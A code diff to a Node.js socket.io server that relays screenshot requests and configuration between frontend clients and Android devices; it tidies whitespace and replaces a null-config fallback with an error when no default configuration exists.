@@ -415,9 +415,9 @@ frontendIo.on("connection", async (socket) => {
                         console.log(chalk.red(`Screenshot response timeout for request ${requestId}, broadcasting to all frontends`));
                         const request = pendingScreenshotResponses.get(requestId);
                         if (request) {
-                            frontendIo.emit("screenshot_error", { 
-                                device_uuid: deviceId, 
-                                error: "Screenshot response timed out" 
+                            frontendIo.emit("screenshot_error", {
+                                device_uuid: deviceId,
+                                error: "Screenshot response timed out"
                             });
                             pendingScreenshotResponses.delete(requestId);
                         }
@@ -621,20 +621,20 @@ frontendIo.on("connection", async (socket) => {
     socket.on("broadcast_default_config", async () => {
         try {
             console.log(chalk.cyan(`[i] Broadcast default config request received from frontend ${socket.id}`));
-            
+
             // Get default config from database
             const defaultConfig = await db.getDefaultConfig();
             if (!defaultConfig) {
                 socket.emit("default_config_error", { error: 'Default config not found' });
                 return;
             }
-            
+
             const configToSend = {
                 server_url: defaultConfig.server_url,
                 screenshot_quality: defaultConfig.screenshot_quality,
                 auto_screenshot: defaultConfig.auto_screenshot === 1
             };
-            
+
             // Update all device configs in database with default config
             const allDeviceConfigs = await db.getAllDeviceConfigs();
             for (const deviceConfig of allDeviceConfigs) {
@@ -646,11 +646,11 @@ frontendIo.on("connection", async (socket) => {
                 );
             }
             console.log(chalk.blue(`[i] Updated ${allDeviceConfigs.length} device configs in database`));
-            
+
             console.log(chalk.green(`[+] Default config to broadcast: ${JSON.stringify(configToSend)}`));
             // Broadcast to all connected Android devices
             androidIo.emit("config_data", configToSend);
-            
+
             console.log(chalk.green(`[+] Default config broadcasted to all Android devices`));
             socket.emit("default_config_broadcasted", { success: true });
         } catch (error) {
@@ -672,20 +672,14 @@ frontendIo.on("connection", async (socket) => {
             } else {
                 // If not exists, generate from default config
                 const generatedConfig = await generateDeviceConfig(deviceUuid);
-                if (generatedConfig) {
-                    socket.emit("device_config_data", {
-                        device_uuid: deviceUuid,
-                        ...generatedConfig
-                    });
-                } else {
-                    // If cannot generate (server_url is null), send null config
-                    socket.emit("device_config_data", {
-                        device_uuid: deviceUuid,
-                        server_url: null,
-                        screenshot_quality: 70,
-                        auto_screenshot: true
-                    });
+                if (!generatedConfig) {
+                    socket.emit("device_config_error", { error: 'Cannot reset: no default config found' });
+                    return;
                 }
+                socket.emit("device_config_data", {
+                    device_uuid: deviceUuid,
+                    ...generatedConfig
+                });
             }
         } catch (error) {
             console.error('Error getting device config:', error);
@@ -748,9 +742,8 @@ frontendIo.on("connection", async (socket) => {
             // Regenerate from default config
             const newConfig = await generateDeviceConfig(deviceUuid);
 
-            // If server_url is null in default config, cannot reset to default
             if (!newConfig) {
-                socket.emit("device_config_error", { error: 'Cannot reset: server_url is not set in default config' });
+                socket.emit("device_config_error", { error: 'Cannot reset: no default config found' });
                 return;
             }
 
